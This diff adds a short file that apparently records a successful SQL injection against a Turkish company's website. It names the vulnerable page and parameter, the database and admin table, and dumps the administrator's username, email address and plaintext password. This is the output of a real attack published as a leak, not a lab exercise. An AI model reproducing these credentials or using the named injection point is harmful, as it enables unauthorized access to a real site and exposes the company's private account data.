@@ -1,0 +1,9 @@
+VULN URL: https://www.semtes.com.tr/teklif-al.php?id=179
+Database: semtescom_hkpanel
+Table: hk_yonetici
+[1 entry]
++-------------+----------------+---------------+----------------+--------------------+----------------+----------------+
+| yonetici_id | yonetici_durum | yonetici_ad   | yonetici_kulad | yonetici_mail      | yonetici_sifre | yonetici_tarih |
++-------------+----------------+---------------+----------------+--------------------+----------------+----------------+
+| 1           | AKTIF          | SEMTES MAKİNE | semtes         | info@semtes.com.tr | Semtes.1616    | 29.09.2021     |
++-------------+----------------+---------------+----------------+--------------------+----------------+----------------+
